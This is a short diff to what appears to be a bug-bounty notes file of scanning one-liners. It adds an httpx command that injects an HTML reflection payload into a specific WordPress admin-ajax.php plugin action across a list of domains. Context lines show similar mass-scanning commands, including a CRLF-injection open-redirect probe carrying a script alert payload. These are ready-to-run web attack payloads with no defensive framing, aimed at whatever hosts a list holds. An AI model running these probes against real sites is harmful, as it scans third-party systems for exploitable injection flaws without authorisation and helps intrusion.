@@ -12,6 +12,10 @@
     cat urls.txt | go run ParamsReflect.go
     cat injected_urls.txt | sort -u | httpx -ms "<h1>akira</h1>" -fe "Location: .*<h1>akira</h1>.*" -t 200
 
+## wordpressXss:
+    cat domain.txt | httpx -path "/wp-admin/admin-ajax.php?action=ptp_design4_color_columns&post_id=1&column_names=%3Ch1%3EAkira%3C/h1%3E" -ms "<h1>Akira</h1>" -fe "Location: .*<h1>Akira</h1>.*" -t 200 -mc 200
+
+    
 ## Open Redirect
     cat URlSubs.txt | ~/go/bin/httpx -path "/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a%3Cscript%3Ealert('XSSSS')%3C/script%3E" -ms "XSSSSS" -fe "Location: .*XSSS.*" -t 200 -o xss.txt
 
